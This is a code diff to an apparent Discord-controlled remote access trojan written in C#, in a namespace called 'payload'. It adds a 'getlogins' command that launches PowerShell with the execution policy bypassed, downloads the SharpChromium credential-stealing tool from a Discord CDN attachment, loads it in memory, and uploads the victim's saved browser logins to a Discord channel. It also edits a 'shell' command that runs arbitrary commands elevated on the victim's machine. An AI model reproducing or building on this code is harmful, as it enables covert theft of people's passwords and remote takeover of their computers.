@@ -232,6 +232,29 @@ namespace payload
                         searcher.Dispose();
                         break;
                     }
+                case "getlogins":
+                    {
+                        if (args[0] != Environment.MachineName) break;
+                        Process cmdproc = new Process()
+                        {
+                            StartInfo = new ProcessStartInfo()
+                            {
+                                FileName = "powershell.exe",
+                                Arguments = "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/966980162497445888/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))",
+                                UseShellExecute = false,
+                                RedirectStandardOutput = true,
+                                Verb = "runas"
+                            }
+                        };
+                        cmdproc.Start();
+                        string output = cmdproc.StandardOutput.ReadToEnd();
+                        cmdproc.WaitForExit();
+
+                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(output));
+                        await message.Channel.SendFileAsync(ms, "unknown.txt", "SharpChromium output:");
+                        ms.Dispose();
+                        break;
+                    }
 
                 case "shell":
                     {
@@ -254,14 +277,11 @@ namespace payload
                                 FileName = "cmd.exe",
                                 Arguments = "/c " + command,
                                 UseShellExecute = false,
-                                RedirectStandardOutput = true,
-                                RedirectStandardError = true,
                                 Verb = "runas"
                             }
                         };
                         cmdproc.Start();
                         cmdproc.WaitForExit();
-
                         await message.Channel.SendMessageAsync($"Command executed on {Environment.MachineName}");
                         break;
                     }
